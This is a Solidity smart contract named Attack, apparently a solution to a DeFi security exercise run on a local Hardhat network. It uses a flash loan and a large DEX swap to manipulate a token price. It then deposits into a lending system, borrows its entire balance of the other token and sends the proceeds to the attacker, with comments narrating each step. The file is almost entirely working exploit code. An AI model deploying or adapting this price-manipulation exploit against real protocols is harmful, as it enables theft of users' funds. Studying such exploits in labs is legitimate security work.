// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts/utils/Strings.sol";

interface ILender{
    function flashLoan(address borrower,bytes calldata data) external;
    function withdraw(uint256 _amount) external;
}

interface IDex{
    function swap(address tokenFrom, address tokenTo, uint256 amountIn) external returns(uint256 amountOut);     
    function addLiquidity(uint256 amount0, uint256 amount1) external;
}

interface IBorrowSystem{
    function depositToken0(uint256 amount) external;
    function depositToken1(uint256 amount) external;
    function borrowToken0(uint256 amount) external;
    function borrowToken1(uint256 amount) external;
}

contract Attack {
    
    function exploit(address lenderAddr,address dexAddr,address borrowAddr,address secAddr,address borAddr) external{
        ILender lenderContract;
        lenderContract = ILender(lenderAddr);
        bytes memory executePayload = abi.encodeWithSignature("drainSystem(address,address,address,address,address)",
                                                                        lenderAddr,dexAddr,borrowAddr,secAddr,borAddr);
        //1.Attacker borrows a large amount of token A from a protocol supporting flash loans.
        lenderContract.flashLoan(address(this),executePayload);
    }

    function drainSystem(address lenderAddr,address dexAddr,address borrowAddr,address secAddr,address borAddr) external{
        ILender lenderContract;
        IDex dexContract;
        IERC20 secContract;
        IERC20 borContract;
        IBorrowSystem borrowContract;
        lenderContract = ILender(lenderAddr); //address(this)
        dexContract = IDex(dexAddr);
        secContract = IERC20(secAddr);
        borContract = IERC20(borAddr);
        borrowContract = IBorrowSystem(borrowAddr);
        address attackAddr=msg.sender;
        //string memory str1; //Just for log purpose

        uint256 mySecFlashedAmt=1000 ether;//secContract.balanceOf(lenderAddr);
        secContract.approve(dexAddr, type(uint256).max);
        borContract.approve(dexAddr, type(uint256).max);
        secContract.approve(borrowAddr, type(uint256).max);
        borContract.approve(borrowAddr, type(uint256).max);

        //Manipulate price swapping SEC (down by offer) by BOR (up by demand)
        console.log("010");
        //str1=string.concat("t1 attk[",Strings.toString(secContract.balanceOf(0x5FbDB2315678afecb367f032d93F642f64180aa3)/(10**18)),"] dex[", Strings.toString(secContract.balanceOf(dexAddr)/(10**18)),"] lend[",Strings.toString(secContract.balanceOf(lenderAddr)/(10**18)),"] borw[",Strings.toString(secContract.balanceOf(borrowAddr)/(10**18)),"]");
        //str2=string.concat("t2 attk[",Strings.toString(borContract.balanceOf(0x5FbDB2315678afecb367f032d93F642f64180aa3)/(10**18)),"] dex[", Strings.toString(borContract.balanceOf(dexAddr)/(10**18)),"] lend[",Strings.toString(borContract.balanceOf(lenderAddr)/(10**18)),"] borw[",Strings.toString(borContract.balanceOf(borrowAddr)/(10**18)),"]");
        //console.log(str1);
        //console.log(str2);
        uint256 outAmt=dexContract.swap(secAddr,borAddr,mySecFlashedAmt);   
        console.log("020 outAmt %s",outAmt/(10**18));

        //Deposit the same BOR but now i get a lot more of SEC
        borrowContract.depositToken1(outAmt);
        borrowContract.borrowToken0(secContract.balanceOf(borrowAddr));
        //console.log("030");
        //str1=string.concat("t1 attk[",Strings.toString(secContract.balanceOf(0x5FbDB2315678afecb367f032d93F642f64180aa3)/(10**18)),"] dex[", Strings.toString(secContract.balanceOf(dexAddr)/(10**18)),"] lend[",Strings.toString(secContract.balanceOf(lenderAddr)/(10**18)),"] borw[",Strings.toString(secContract.balanceOf(borrowAddr)/(10**18)),"]");
        //console.log(str1);
        //str1=string.concat("t2 attk[",Strings.toString(borContract.balanceOf(0x5FbDB2315678afecb367f032d93F642f64180aa3)/(10**18)),"] dex[", Strings.toString(borContract.balanceOf(dexAddr)/(10**18)),"] lend[",Strings.toString(borContract.balanceOf(lenderAddr)/(10**18)),"] borw[",Strings.toString(borContract.balanceOf(borrowAddr)/(10**18)),"]");
        //console.log(str1);

        // Transfer to attacker all SEC balance minus 10.000 to pay flashloan
        uint256 myNewSecAmt = secContract.balanceOf(lenderAddr);
        console.log("070 myNewSecAmt %s mySecFlashedAmt %s",myNewSecAmt/(10**18),mySecFlashedAmt/(10**18));
        secContract.transfer(attackAddr, myNewSecAmt - 10000 ether);

        //Now borrowSystem has no SEC tokens (drained)
        //str1=string.concat("t1 attk[",Strings.toString(secContract.balanceOf(0x5FbDB2315678afecb367f032d93F642f64180aa3)/(10**18)),"] dex[", Strings.toString(secContract.balanceOf(dexAddr)/(10**18)),"] lend[",Strings.toString(secContract.balanceOf(lenderAddr)/(10**18)),"] borw[",Strings.toString(secContract.balanceOf(borrowAddr)/(10**18)),"]");
        //console.log(str1);
        //str1=string.concat("t2 attk[",Strings.toString(borContract.balanceOf(0x5FbDB2315678afecb367f032d93F642f64180aa3)/(10**18)),"] dex[", Strings.toString(borContract.balanceOf(dexAddr)/(10**18)),"] lend[",Strings.toString(borContract.balanceOf(lenderAddr)/(10**18)),"] borw[",Strings.toString(borContract.balanceOf(borrowAddr)/(10**18)),"]");
        //console.log(str1);
    }

}